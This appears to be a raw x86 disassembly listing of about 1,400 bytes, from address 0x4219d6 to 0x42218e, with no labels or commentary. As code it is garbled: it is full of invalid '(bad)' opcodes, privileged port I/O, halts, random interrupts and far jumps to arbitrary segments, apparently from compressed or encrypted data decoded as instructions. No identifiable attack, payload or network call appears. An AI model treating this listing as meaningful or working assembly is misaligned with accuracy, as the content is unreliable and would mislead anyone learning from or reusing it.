  4219d6:	dec    eax
  4219d7:	pop    esp
  4219d8:	mov    gs:0x72b92d91,al
  4219de:	enter  0x75f5,0xbf
  4219e2:	rcr    DWORD PTR [eax-0x61],cl
  4219e5:	jl     0x4219de
  4219e7:	pop    edi
  4219e8:	lahf   
  4219e9:	cmp    eax,0x5707ed7d
  4219ee:	jbe    0x4219ce
  4219f0:	test   ah,0x46
  4219f3:	push   edi
  4219f4:	add    eax,0xe600146e
  4219f9:	xlat   BYTE PTR ds:[ebx]
  4219fa:	mov    edi,0xadf0c4f6
  4219ff:	dec    edi
  421a00:	jle    0x421a2a
  421a02:	cmp    eax,0x6ee38a2e
  421a07:	sar    DWORD PTR [esi],0x55
  421a0a:	or     BYTE PTR [eax+0x45],al
  421a0d:	pop    ebp
  421a0e:	adc    eax,0xd02a1a9a
  421a13:	or     ch,BYTE PTR ds:0xac0e350a
  421a19:	hlt    
  421a1a:	adc    al,BYTE PTR [edi-0x7f]
  421a1d:	and    BYTE PTR [esi-0x103c73e3],ah
  421a23:	inc    edi
  421a24:	out    dx,eax
  421a25:	or     ah,dl
  421a27:	out    dx,al
  421a28:	(bad)  
  421a29:	and    eax,DWORD PTR [eax]
  421a2b:	test   BYTE PTR [ecx-0x2dc048ce],0x49
  421a32:	dec    ebx
  421a33:	ret    
  421a34:	sti    
  421a35:	cwde   
  421a36:	inc    ebp
  421a37:	stos   BYTE PTR es:[edi],al
  421a38:	test   eax,0x560668c6
  421a3d:	adc    ch,BYTE PTR [edx+0x78fe4ed7]
  421a43:	mov    bl,0x3d
  421a45:	fcmove st,st(3)
  421a47:	bound  eax,QWORD PTR [eax]
  421a49:	push   ecx
  421a4a:	xor    al,0x5d
  421a4c:	stos   DWORD PTR es:[edi],eax
  421a4d:	cmp    edi,DWORD PTR ds:0xed8b1eaf
  421a53:	jns    0x421a87
  421a55:	adc    BYTE PTR [eax-0x73f526b0],al
  421a5b:	lods   eax,DWORD PTR ds:[esi]
  421a5c:	xor    al,0xe7
  421a5e:	(bad)  
  421a5f:	mov    cl,0xe
  421a61:	inc    eax
  421a62:	mov    bl,0xba
  421a64:	rol    cl,1
  421a66:	test   DWORD PTR [ebp+0x4086ca4],eax
  421a6c:	inc    ebp
  421a6d:	outs   dx,BYTE PTR ds:[esi]
  421a6e:	adc    DWORD PTR [esp+eax*4],esi
  421a71:	mov    DWORD PTR [edx+esi*2],esi
  421a74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421a75:	fcom   QWORD PTR ds:0x5dd49264
  421a7b:	sub    DWORD PTR [eax],edi
  421a7d:	rcr    DWORD PTR [ebx],cl
  421a7f:	push   0x1c
  421a81:	scas   eax,DWORD PTR es:[edi]
  421a82:	xor    DWORD PTR [ecx+edi*2+0x1f703762],0x48
  421a8a:	sti    
  421a8b:	and    DWORD PTR [edi],ebx
  421a8d:	xchg   esi,eax
  421a8e:	push   ebp
  421a8f:	inc    eax
  421a90:	enter  0x31af,0xe4
  421a94:	xor    eax,0x53f852f7
  421a99:	inc    eax
  421a9a:	mov    BYTE PTR [esi+0x5b],bl
  421a9d:	inc    ecx
  421a9e:	ret    0x19ba
  421aa1:	int    0xc2
  421aa3:	sub    ecx,ebp
  421aa5:	mov    ebx,DWORD PTR [edi-0x60b9c3c4]
  421aab:	sar    DWORD PTR [eax+ecx*1+0x5da20648],cl
  421ab2:	sahf   
  421ab3:	pop    edi
  421ab4:	cmp    edi,ecx
  421ab6:	stc    
  421ab7:	xchg   edi,eax
  421ab8:	call   DWORD PTR [edx]
  421aba:	shl    BYTE PTR [edi],0xb1
  421abd:	shl    DWORD PTR [eax-0xc47ffaf],0x9d
  421ac4:	jg     0x421b42
  421ac6:	out    0xca,al
  421ac8:	in     al,dx
  421ac9:	hlt    
  421aca:	xchg   edx,eax
  421acb:	out    dx,eax
  421acc:	jle    0x421b30
  421ace:	add    edx,DWORD PTR [edx]
  421ad0:	mov    DWORD PTR [ebp-0x10],esi
  421ad3:	dec    edx
  421ad4:	imul   edx,eax,0xebf2f3a
  421ada:	sub    eax,0x1a457681
  421adf:	test   DWORD PTR ds:0x5dfaf884,esi
  421ae5:	add    DWORD PTR [edx-0x35],0xc74a78c2
  421aec:	xor    al,0xe
  421aee:	out    dx,eax
  421aef:	jne    0x421af1
  421af1:	mov    es,edi
  421af3:	iret   
  421af4:	je     0x421af6
  421af6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421af7:	dec    ebx
  421af8:	sbb    bh,dl
  421afa:	mov    dh,0x1f
  421afc:	popa   
  421afd:	fmul   QWORD PTR [ebx-0x15fc4732]
  421b03:	scas   al,BYTE PTR es:[edi]
  421b04:	cmp    bh,BYTE PTR [ebx+0x5fae396]
  421b0a:	push   edx
  421b0b:	jp     0x421b40
  421b0d:	inc    esp
  421b0e:	push   DWORD PTR [edx+esi*4-0x6ee59008]
  421b15:	je     0x421b2e
  421b17:	jl     0x421afe
  421b19:	sbb    DWORD PTR ds:0x5e83ec80,ecx
  421b1f:	adc    eax,0x7c580752
  421b24:	add    eax,DWORD PTR [ebp+0x2e]
  421b27:	pop    ecx
  421b28:	and    eax,0xfae24090
  421b2d:	pop    eax
  421b2e:	sbb    BYTE PTR [ecx],0x60
  421b31:	xor    edx,DWORD PTR [esi-0x5f]
  421b34:	jns    0x421b66
  421b36:	pop    ebp
  421b37:	retf   
  421b38:	stos   DWORD PTR es:[edi],eax
  421b39:	pop    ecx
  421b3a:	cdq    
  421b3b:	test   eax,0xbed486ac
  421b40:	xor    al,0xd9
  421b42:	push   esp
  421b43:	jo     0x421b4f
  421b45:	pop    ebp
  421b46:	mov    esp,0x8d2411e4
  421b4b:	xor    ah,dh
  421b4d:	xchg   ebx,eax
  421b4e:	sub    eax,0xb36a66bf
  421b53:	pop    es
  421b54:	mov    al,0x83
  421b56:	icebp  
  421b57:	ins    BYTE PTR es:[edi],dx
  421b58:	xchg   BYTE PTR [ebp-0x11f5a130],bh
  421b5e:	retf   0x268c
  421b61:	repnz push 0x1ee10874
  421b67:	lea    ebx,[ecx+0x690ea9cf]
  421b6d:	pop    edx
  421b6e:	sbb    eax,0x47127d5a
  421b73:	xor    cl,bl
  421b75:	add    eax,0x96ab2ed5
  421b7a:	push   ebx
  421b7b:	cmc    
  421b7c:	xor    edi,DWORD PTR [edi+ebx*8]
  421b7f:	in     eax,dx
  421b80:	das    
  421b81:	jo     0x421b76
  421b83:	xchg   edi,edi
  421b85:	cld    
  421b86:	or     al,0xfe
  421b88:	nop
  421b89:	add    eax,esp
  421b8b:	ror    ebp,0x1b
  421b8e:	out    dx,eax
  421b8f:	jge    0x421b5c
  421b91:	mov    ch,0x45
  421b93:	inc    ebp
  421b94:	ror    BYTE PTR [eax+0x3b3ceb8c],0x29
  421b9b:	sub    eax,0x434431af
  421ba0:	inc    ebp
  421ba1:	mov    eax,0x9a6be317
  421ba6:	jmp    0xb4d2:0x211aa645
  421bad:	mov    BYTE PTR [esi+0x5fef069a],bh
  421bb3:	test   bh,ch
  421bb5:	pop    edx
  421bb6:	or     DWORD PTR [ebp+0xb],0xffffffa5
  421bba:	mov    esp,esi
  421bbc:	int    0x79
  421bbe:	ror    bh,cl
  421bc0:	add    cl,BYTE PTR [eax-0xe]
  421bc3:	outs   dx,BYTE PTR ds:[esi]
  421bc4:	cmp    DWORD PTR [eax-0x7297ff0a],0xb29397da
  421bce:	loope  0x421b73
  421bd0:	pop    ss
  421bd1:	xor    al,0x9a
  421bd3:	dec    ebp
  421bd4:	inc    ebx
  421bd5:	repz push ebx
  421bd7:	jno    0x421c24
  421bd9:	imul   ecx,DWORD PTR [esi+ebp*2-0x30],0x26
  421bde:	dec    edi
  421bdf:	pop    edi
  421be0:	in     al,0x4
  421be2:	mov    ecx,0x80995ea7
  421be7:	inc    ecx
  421be8:	mov    WORD PTR gs:[edx-0x29],?
  421bec:	mov    ds:0x891e58b8,eax
  421bf1:	xlat   BYTE PTR ds:[ebx]
  421bf2:	pusha  
  421bf3:	mov    dl,0x94
  421bf5:	pop    ebp
  421bf6:	mul    DWORD PTR [ebx-0x18]
  421bf9:	es call 0x5ea:0xac01f644
  421c01:	scas   eax,DWORD PTR es:[edi]
  421c02:	test   eax,0x961f309e
  421c07:	shl    DWORD PTR [esi+0x6d],cl
  421c0a:	shl    BYTE PTR [ecx+0x1c],1
  421c0d:	cmp    ah,ah
  421c0f:	dec    eax
  421c10:	ds and al,0xd
  421c13:	sbb    ecx,ecx
  421c15:	inc    edi
  421c16:	sub    BYTE PTR [edi-0x5d],ch
  421c19:	shl    DWORD PTR [bp+di+0x76c7],1
  421c1e:	(bad)  
  421c1f:	xor    ch,BYTE PTR [edx]
  421c21:	cwde   
  421c22:	inc    esp
  421c23:	pop    ebp
  421c24:	mov    edi,cs
  421c26:	inc    ebp
  421c27:	data16 adc ch,dh
  421c2a:	sub    DWORD PTR [edx],edi
  421c2c:	mov    dh,0xa9
  421c2e:	jno    0x421bb1
  421c30:	cwde   
  421c31:	cs inc ecx
  421c33:	loopne 0x421c57
  421c35:	jo     0x421cad
  421c37:	je     0x421c34
  421c39:	mov    ebp,0x2cd870d8
  421c3e:	add    edi,DWORD PTR [eax-0x1b]
  421c41:	aad    0xa7
  421c43:	sti    
  421c44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c45:	inc    esi
  421c46:	scas   eax,DWORD PTR es:[edi]
  421c47:	fcom   DWORD PTR [eax+edx*2-0x43]
  421c4b:	cmp    al,0x1b
  421c4d:	add    dh,BYTE PTR [edx+0x2d]
  421c50:	push   edx
  421c51:	and    BYTE PTR [esi],al
  421c53:	inc    ebp
  421c54:	push   eax
  421c55:	add    eax,0x41541d10
  421c5a:	mov    eax,0x6189ccd6
  421c5f:	mov    ch,0xc1
  421c61:	sbb    edx,edx
  421c63:	inc    ebx
  421c64:	jle    0x421c11
  421c66:	xchg   ecx,eax
  421c67:	call   0x1bbc4c93
  421c6c:	dec    esi
  421c6d:	mov    ch,0xd1
  421c6f:	inc    ebx
  421c70:	in     al,dx
  421c71:	fcomp  DWORD PTR [edi]
  421c73:	push   eax
  421c74:	imul   DWORD PTR [eax]
  421c76:	xchg   esp,eax
  421c77:	icebp  
  421c78:	shl    DWORD PTR [edi+0x2a],cl
  421c7b:	cs loope 0x421cd9
  421c7e:	pusha  
  421c7f:	std    
  421c80:	cmp    DWORD PTR ds:0x2c7798c0,eax
  421c86:	pop    edx
  421c87:	inc    edx
  421c88:	inc    ebx
  421c89:	test   eax,0x8010b39b
  421c8e:	push   esi
  421c8f:	ds loop 0x421c13
  421c92:	fucomp st(0)
  421c94:	xor    dl,BYTE PTR [esi+0x37]
  421c97:	out    dx,eax
  421c98:	push   eax
  421c99:	rcl    DWORD PTR [ebp+0x29],0x49
  421c9d:	mov    ecx,0xa9133b39
  421ca2:	outs   dx,DWORD PTR ds:[esi]
  421ca3:	(bad)  
  421ca4:	push   esi
  421ca5:	imul   esi,DWORD PTR [ebp-0x7d81cb54],0xb230bb0a
  421caf:	adc    BYTE PTR [esi+edx*1+0x32bdb518],ch
  421cb6:	push   0xffffffb7
  421cb8:	add    ebp,DWORD PTR [eax-0x45]
  421cbb:	ja     0x421c59
  421cbd:	call   0x75a7:0xf228e355
  421cc4:	adc    al,ah
  421cc6:	icebp  
  421cc7:	jl     0x421d1d
  421cc9:	bt     DWORD PTR [edi-0x6053859a],esp
  421cd0:	jmp    0x170:0x23f720e1
  421cd7:	lods   eax,DWORD PTR ds:[esi]
  421cd8:	push   cs
  421cd9:	scas   al,BYTE PTR es:[edi]
  421cda:	rcl    DWORD PTR [ebp+0x5f5abfa8],cl
  421ce0:	sub    eax,0x1a44745f
  421ce5:	sbb    BYTE PTR [edi+0x6],ah
  421ce8:	je     0x421d51
  421cea:	retf   
  421ceb:	mul    DWORD PTR [ebx-0x3d]
  421cee:	popa   
  421cef:	mov    ds:0xbb7a7000,eax
  421cf4:	mov    esp,0x3a40070b
  421cf9:	adc    ebx,0x5639f65
  421cff:	push   esi
  421d00:	push   ecx
  421d01:	pop    eax
  421d02:	pop    es
  421d03:	fdiv   QWORD PTR [edx+eiz*8+0x69f7871a]
  421d0a:	push   eax
  421d0b:	jno    0x421cd6
  421d0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421d0e:	ss push esp
  421d10:	ret    0xa2aa
  421d13:	inc    eax
  421d14:	rcr    BYTE PTR [eax+0x630ffaf2],cl
  421d1a:	pop    ds
  421d1b:	mov    WORD PTR [ebx-0x52356090],es
  421d21:	retf   0x9f1e
  421d24:	lea    ebp,[edi+eiz*1+0x7a]
  421d28:	add    DWORD PTR ds:0xe8a023c8,ebx
  421d2e:	sbb    DWORD PTR [eax+0x73406caa],esi
  421d34:	loopne 0x421d9e
  421d36:	xchg   ebx,eax
  421d37:	xchg   esi,eax
  421d38:	(bad)  
  421d39:	and    edi,DWORD PTR [edx+0x19]
  421d3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d3d:	adc    edx,DWORD PTR ds:0x8350328f
  421d43:	cwde   
  421d44:	sub    bl,BYTE PTR [ebx+0x2c]
  421d47:	dec    ebx
  421d48:	hlt    
  421d49:	xchg   esi,eax
  421d4a:	sub    dl,BYTE PTR [ebx]
  421d4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d4d:	shr    esi,0xd2
  421d50:	adc    al,0xe5
  421d52:	push   esi
  421d53:	cmp    DWORD PTR [eax],esi
  421d55:	outs   dx,BYTE PTR ds:[esi]
  421d56:	mov    esp,0x9c63e5a7
  421d5b:	xor    bl,cl
  421d5d:	mov    cl,0x92
  421d5f:	push   esi
  421d60:	sub    al,0x67
  421d62:	sub    al,0xa3
  421d64:	xchg   esi,eax
  421d65:	push   ebx
  421d66:	inc    ecx
  421d67:	bound  ebp,QWORD PTR [edx]
  421d69:	outs   dx,DWORD PTR ds:[esi]
  421d6a:	xchg   BYTE PTR [ecx],ch
  421d6c:	pop    ebp
  421d6d:	sar    DWORD PTR [eax-0x514e644f],1
  421d73:	sahf   
  421d74:	cli    
  421d75:	pop    ebp
  421d76:	sbb    eax,0x235d692
  421d7b:	mov    ds:0x7ac96b76,eax
  421d80:	xor    dh,BYTE PTR [eax-0x7038048]
  421d86:	inc    esp
  421d87:	int    0xde
  421d89:	push   esp
  421d8a:	fsubr  DWORD PTR [eax]
  421d8c:	add    BYTE PTR [edi+ebx*1],bl
  421d8f:	into   
  421d90:	movhps xmm6,QWORD PTR [edi]
  421d93:	cmp    dh,0x3d
  421d96:	add    BYTE PTR [esi-0x678b7014],cl
  421d9c:	inc    edx
  421d9d:	xlat   BYTE PTR ds:[ebx]
  421d9e:	(bad)  
  421d9f:	lea    edi,[ebp+0x1e]
  421da2:	inc    ebp
  421da3:	out    0x38,eax
  421da5:	sbb    cl,bh
  421da7:	inc    esi
  421da8:	cmp    eax,0xb490eb91
  421dad:	push   edx
  421dae:	mov    bl,cl
  421db0:	mov    esp,0xaeb29038
  421db5:	retf   
  421db6:	adc    BYTE PTR [eax+0x1b4f96af],0x4e
  421dbd:	jmp    0x421d7f
  421dbf:	and    BYTE PTR [ecx+edi*2+0x45],dl
  421dc3:	add    DWORD PTR [edx-0x30],esp
  421dc6:	xor    al,0xb9
  421dc8:	cmp    eax,0x1eaf0694
  421dcd:	mov    bh,BYTE PTR [edi+0x5af18eb5]
  421dd3:	xchg   esp,eax
  421dd4:	and    edx,eax
  421dd6:	imul   DWORD PTR [ecx-0x50155844]
  421ddc:	fisubr WORD PTR [edx+ecx*8]
  421ddf:	xor    esp,DWORD PTR [esi-0xf691ce5]
  421de5:	dec    esp
  421de6:	dec    esp
  421de7:	xchg   ebx,eax
  421de8:	jno    0x421e63
  421dea:	dec    ebp
  421deb:	lahf   
  421dec:	mov    ds:0xd597a33c,eax
  421df1:	icebp  
  421df2:	and    dl,BYTE PTR [esi-0x5669f1c9]
  421df8:	pop    esi
  421df9:	inc    esp
  421dfa:	cmp    DWORD PTR [ebx+eax*1+0x2996589d],ebp
  421e01:	mov    al,ds:0xab3d87c
  421e06:	mov    al,ds:0xa99c4d65
  421e0b:	mov    ah,0xa6
  421e0d:	scas   al,BYTE PTR es:[edi]
  421e0e:	imul   ebx,DWORD PTR [ecx],0x665d9df8
  421e14:	fiadd  DWORD PTR [ecx+0x7f79be1a]
  421e1a:	fadd   QWORD PTR [edx]
  421e1c:	out    0xff,al
  421e1e:	sti    
  421e1f:	push   eax
  421e20:	or     eax,0x46c2bdfb
  421e25:	add    eax,esp
  421e27:	cmc    
  421e28:	xchg   ebx,eax
  421e29:	xor    al,0x1c
  421e2b:	std    
  421e2c:	push   edi
  421e2d:	sar    DWORD PTR [esi],0x80
  421e30:	cld    
  421e31:	and    al,0x80
  421e33:	sub    ebp,DWORD PTR [eax+0x57bd5e9e]
  421e39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e3a:	jmp    0x5193d2c9
  421e3f:	push   esp
  421e40:	jns    0x421e18
  421e42:	xor    eax,0x350ad018
  421e47:	pop    esi
  421e48:	mov    ecx,edx
  421e4a:	pop    ds
  421e4b:	lea    esp,ds:0x35d63f76
  421e51:	in     al,0x94
  421e53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e54:	lahf   
  421e55:	bound  edx,QWORD PTR [eax]
  421e57:	gs loop 0x421eb3
  421e5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e5b:	xchg   DWORD PTR [edx+edx*8-0x4f42e044],esp
  421e62:	xchg   esi,eax
  421e63:	cmp    eax,0xd2029c2a
  421e68:	cmp    ch,BYTE PTR [edi+0x1c]
  421e6b:	retf   
  421e6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e6d:	mul    ebx
  421e6f:	mov    ch,0x1
  421e71:	jne    0x421ea4
  421e73:	(bad)  
  421e74:	push   esp
  421e75:	sbb    DWORD PTR [eax+0x6345b969],eax
  421e7b:	cwde   
  421e7c:	bound  ecx,QWORD PTR [edi]
  421e7e:	push   ebx
  421e7f:	(bad)  
  421e80:	cmp    DWORD PTR ds:0x82baf11a,eax
  421e86:	jns    0x421e94
  421e88:	shr    ebx,1
  421e8a:	imul   edi,DWORD PTR ds:0x7e54dd62,0x5a
  421e91:	out    0x58,al
  421e93:	xchg   edi,eax
  421e94:	test   eax,0xc4cb467
  421e99:	push   ebx
  421e9a:	xlat   BYTE PTR ds:[ebx]
  421e9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e9c:	je     0x421ef1
  421e9e:	jecxz  0x421f08
  421ea0:	jns    0x421f15
  421ea2:	mov    BYTE PTR [ebx+0x63],cl
  421ea5:	iret   
  421ea6:	jb     0x421ef7
  421ea8:	add    ebp,ebx
  421eaa:	jae    0x421ec7
  421eac:	sbb    BYTE PTR [esi+0x2],bh
  421eaf:	fdivr  QWORD PTR [edx+0x37de5133]
  421eb5:	sbb    DWORD PTR [esi],esi
  421eb7:	or     al,BYTE PTR [eax]
  421eb9:	xlat   BYTE PTR ds:[ebx]
  421eba:	outs   dx,DWORD PTR ds:[esi]
  421ebb:	out    dx,al
  421ebc:	cmp    eax,0x732be778
  421ec1:	cmp    al,0x79
  421ec3:	push   es
  421ec4:	int3   
  421ec5:	pop    esi
  421ec6:	add    dh,BYTE PTR [esi+0x1e]
  421ec9:	add    esi,edx
  421ecb:	mov    ds:0xee639718,eax
  421ed0:	mov    ds:0x7a603645,al
  421ed5:	jo     0x421f05
  421ed7:	sbb    bl,bl
  421ed9:	ret    
  421eda:	or     al,0x7d
  421edc:	dec    edx
  421edd:	imul   edx,DWORD PTR [eax],0x6f33e9ae
  421ee3:	xchg   esp,eax
  421ee4:	fiadd  DWORD PTR [esi+0x7a]
  421ee7:	or     BYTE PTR [edi+eiz*4+0x1d],cl
  421eeb:	sbb    edi,DWORD PTR [ebp+ebx*4+0x67]
  421eef:	mov    bl,bl
  421ef1:	pop    edi
  421ef2:	mov    ds:0x67ca9f37,eax
  421ef7:	or     cl,BYTE PTR [esp+esi*4+0x2e]
  421efb:	adc    DWORD PTR [edi+eiz*4],ebx
  421efe:	sahf   
  421eff:	(bad)  
  421f00:	in     eax,0x5d
  421f02:	daa    
  421f03:	lahf   
  421f04:	sbb    BYTE PTR [edx-0x7862804],ah
  421f0a:	sub    DWORD PTR [edi+0x329dd31b],ebp
  421f10:	mov    eax,0x8df6de75
  421f15:	mov    al,0xa
  421f17:	lods   eax,DWORD PTR ds:[esi]
  421f18:	retf   
  421f19:	cmp    ah,BYTE PTR [eax+0x177ee7d2]
  421f1f:	call   0xf79dfc73
  421f24:	jnp    0x421f43
  421f26:	pusha  
  421f27:	and    ah,bl
  421f29:	(bad)  
  421f2a:	in     eax,dx
  421f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421f2c:	add    BYTE PTR [edx*8+0x748364e6],dh
  421f33:	xchg   edx,eax
  421f34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f35:	sbb    BYTE PTR [edi],cl
  421f37:	lahf   
  421f38:	cmp    eax,0x602dca02
  421f3d:	jno    0x421f52
  421f3f:	mov    eax,0xa7e05bfb
  421f44:	aaa    
  421f45:	es bnd jg 0x421edc
  421f49:	popa   
  421f4a:	mov    ds:0x61eaf000,eax
  421f4f:	jg     0x421f4c
  421f51:	fistp  WORD PTR [edi+0x0]
  421f54:	mov    cs,WORD PTR [esi-0x80]
  421f57:	mov    ebp,0xcbdec00b
  421f5c:	shr    BYTE PTR [edi+ebx*1-0xa26b9a1],0x40
  421f64:	sahf   
  421f65:	popa   
  421f66:	cmp    al,0x83
  421f68:	fild   WORD PTR [esi]
  421f6a:	test   eax,0x35beed7c
  421f6f:	sub    bh,ah
  421f71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f72:	add    DWORD PTR [eax+0x3],edi
  421f75:	stc    
  421f76:	stos   BYTE PTR es:[edi],al
  421f77:	ss mov ebx,0x64249cd6
  421f7d:	(bad)  
  421f7f:	cmp    al,0x37
  421f81:	dec    ebx
  421f82:	xchg   DWORD PTR [ebx+0x11df4e8],edi
  421f88:	jmp    0x421f62
  421f8a:	xor    DWORD PTR [edx],edx
  421f8c:	jmp    0x2734:0xb6fe41ee
  421f93:	or     DWORD PTR [ecx-0x56],eax
  421f96:	stc    
  421f97:	stc    
  421f98:	inc    ecx
  421f99:	adc    eax,0x6120cfa8
  421f9e:	cmc    
  421f9f:	mov    al,0x10
  421fa1:	sub    eax,0x54b7096f
  421fa6:	cmp    DWORD PTR [esi+ebx*8+0x19c699fc],esi
  421fad:	and    BYTE PTR [edx+0x48004d79],0x1
  421fb4:	call   0x1c9:0x49c6fff9
  421fbb:	sbb    eax,0xcd091e4d
  421fc0:	hlt    
  421fc1:	jecxz  0x421fdb
  421fc3:	sbb    ebp,ebp
  421fc5:	scas   al,BYTE PTR es:[edi]
  421fc6:	aas    
  421fc7:	xor    eax,0xb1f24192
  421fcc:	xor    al,BYTE PTR [ecx]
  421fce:	push   0x59064277
  421fd3:	inc    eax
  421fd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421fd5:	push   ds
  421fd6:	mov    ecx,0x4c7bd17b
  421fdb:	int3   
  421fdc:	aas    
  421fdd:	mov    ds:0xa8116f3d,eax
  421fe2:	dec    ebx
  421fe3:	cdq    
  421fe4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421fe5:	lods   al,BYTE PTR ds:[esi]
  421fe6:	cmp    dl,ch
  421fe8:	push   edi
  421fe9:	inc    edx
  421fea:	test   DWORD PTR [ecx+0x75],0x3067d7c8
  421ff1:	ins    DWORD PTR es:[edi],dx
  421ff2:	dec    ecx
  421ff3:	mov    bl,0xd9
  421ff5:	(bad)  [ecx-0x55c6ab8b]
  421ffb:	ins    BYTE PTR es:[edi],dx
  421ffc:	sub    edi,esi
  421ffe:	loopne 0x422014
  422000:	mov    al,BYTE PTR [esi+ecx*2-0x70]
  422004:	cli    
  422005:	sub    edx,eax
  422007:	or     ch,BYTE PTR [eax]
  422009:	mov    edx,0x2395726c
  42200e:	dec    edx
  42200f:	aad    0x55
  422011:	xchg   esp,eax
  422012:	mov    edx,0x6796af1
  422017:	sub    al,0x6d
  422019:	xor    edx,edi
  42201b:	jmp    0xabc9039
  422020:	mov    esp,0xe5f8037c
  422025:	outs   dx,DWORD PTR ds:[esi]
  422026:	mov    ebp,0xb0b1bc03
  42202b:	push   ecx
  42202c:	add    BYTE PTR [eax],ch
  42202e:	ret    
  42202f:	cld    
  422030:	(bad)  
  422031:	int    0x39
  422033:	lock fwait
  422035:	xlat   BYTE PTR ds:[ebx]
  422036:	cmp    DWORD PTR [esi-0x2a94a0e1],0xf621a377
  422040:	mov    dh,0x96
  422042:	mov    esp,0x7c00154b
  422047:	mov    esp,0x4d67072e
  42204c:	test   DWORD PTR [eax+0x6c79f5c6],esi
  422052:	xor    DWORD PTR [edx-0x60],ebp
  422055:	sub    ah,BYTE PTR [edi+0x73]
  422058:	int    0xfe
  42205a:	imul   esp,DWORD PTR [ebx],0x9b67d416
  422060:	jmp    0x422033
  422062:	fcomp  DWORD PTR [eax+0x609153f]
  422068:	sub    al,cl
  42206a:	mov    esi,DWORD PTR [ebx+ebp*2]
  42206d:	jmp    0x5c47:0xa80973c3
  422074:	or     esp,DWORD PTR [eax]
  422076:	and    eax,0x16d95da0
  42207b:	sti    
  42207c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42207d:	bound  esp,QWORD PTR [eax-0x42]
  422080:	inc    eax
  422081:	daa    
  422082:	sub    BYTE PTR [eax],dl
  422084:	rcl    DWORD PTR [edx+0x6506186f],0x25
  42208b:	pusha  
  42208c:	lds    esi,FWORD PTR [ebx+ebx*1]
  42208f:	pop    es
  422090:	dec    esi
  422091:	lds    edx,FWORD PTR [edi-0x47]
  422094:	lds    esi,FWORD PTR [ecx+edx*2-0x1b]
  422098:	aam    0x2c
  42209a:	lock adc DWORD PTR [eax+0x1e],esp
  42209e:	add    al,0x0
  4220a0:	jl     0x4220cb
  4220a2:	outs   dx,DWORD PTR ds:[esi]
  4220a3:	xchg   edx,eax
  4220a4:	js     0x422072
  4220a6:	fdivrp st(2),st
  4220a8:	mov    ds:0x2f7329ec,eax
  4220ad:	ja     0x422058
  4220af:	gs cs mov esp,0x34c5e517
  4220b6:	dec    esp
  4220b7:	push   cs
  4220b8:	pop    esi
  4220b9:	pop    ds
  4220ba:	add    dh,BYTE PTR [eax+0x7136cde4]
  4220c0:	ss cs jno 0x4220ce
  4220c4:	loopne 0x4220f5
  4220c6:	pusha  
  4220c7:	aad    0x77
  4220c9:	pop    ds
  4220ca:	mov    edx,0x4f2d317c
  4220cf:	ss dec ebp
  4220d1:	add    edx,ebp
  4220d3:	mov    dh,0xf3
  4220d5:	into   
  4220d6:	scas   al,BYTE PTR es:[edi]
  4220d7:	imul   edx,DWORD PTR [edi],0x208b9d56
  4220dd:	mov    ebx,0x97f0f1ae
  4220e2:	loopne 0x4220fe
  4220e4:	add    BYTE PTR [edx-0x7],bh
  4220e7:	push   es
  4220e8:	jmp    0x4220f7
  4220ea:	pop    ebx
  4220eb:	cli    
  4220ec:	retf   
  4220ed:	in     eax,0xf8
  4220ef:	cs enter 0x961,0x2c
  4220f4:	push   es
  4220f5:	clc    
  4220f6:	outs   dx,BYTE PTR ds:[esi]
  4220f7:	leave  
  4220f8:	lds    eax,FWORD PTR [edx]
  4220fa:	js     0x4220e9
  4220fc:	adc    BYTE PTR [eax],bl
  4220fe:	repnz ficomp WORD PTR [ebp+0x736d6071]
  422105:	popa   
  422106:	mov    ds:0xcff57000,eax
  42210b:	lahf   
  42210c:	clc    
  42210d:	shl    edx,1
  42210f:	(bad)  
  422110:	dec    ebx
  422111:	jg     0x4220ea
  422113:	(bad)  [edx]
  422115:	xchg   edi,eax
  422116:	popa   
  422117:	mov    al,0x17
  422119:	lods   al,BYTE PTR ds:[esi]
  42211a:	pop    edx
  42211b:	in     eax,0xd4
  42211d:	jecxz  0x42210a
  42211f:	or     esp,DWORD PTR [esi]
  422121:	mov    ebp,0x3c800b1d
  422126:	ss pop eax
  422128:	jae    0x422176
  42212a:	push   ebx
  42212b:	outs   dx,BYTE PTR ds:[esi]
  42212c:	sbb    edx,DWORD PTR [esi+0x77]
  42212f:	mov    dh,0xb9
  422131:	and    BYTE PTR [edx],0x28
  422134:	dec    esp
  422135:	arpl   WORD PTR [ecx],dx
  422137:	push   ss
  422138:	xlat   BYTE PTR ds:[ebx]
  422139:	mov    ah,0x71
  42213b:	inc    ebp
  42213c:	adc    DWORD PTR [eax+0x7f],0x6f34b1b3
  422143:	and    dh,BYTE PTR [edi+edx*4]
  422146:	mov    ebx,0x3ad44546
  42214b:	clc    
  42214c:	mov    cl,0xe1
  42214e:	mov    ds:0x2531ee70,al
  422153:	pop    ds
  422154:	xor    eax,0x43b29f4e
  422159:	mov    ds:0x8d412b43,eax
  42215e:	int    0xe3
  422160:	or     dl,BYTE PTR [eax+0x45]
  422163:	rcr    BYTE PTR [eax-0x5f],1
  422166:	clc    
  422167:	adc    eax,DWORD PTR [eax+0x37e44417]
  42216d:	push   edi
  42216e:	dec    esi
  42216f:	ret    0xe509
  422172:	mov    al,ds:0xac4964c1
  422177:	test   eax,0xd48c3453
  42217c:	ds pop edi
  42217e:	add    bl,BYTE PTR [ebx+0x31f2d050]
  422184:	shl    DWORD PTR [edx],0xf7
  422187:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422188:	ins    BYTE PTR es:[edi],dx
  422189:	or     eax,0x53da4bc8
  42218e:	daa    
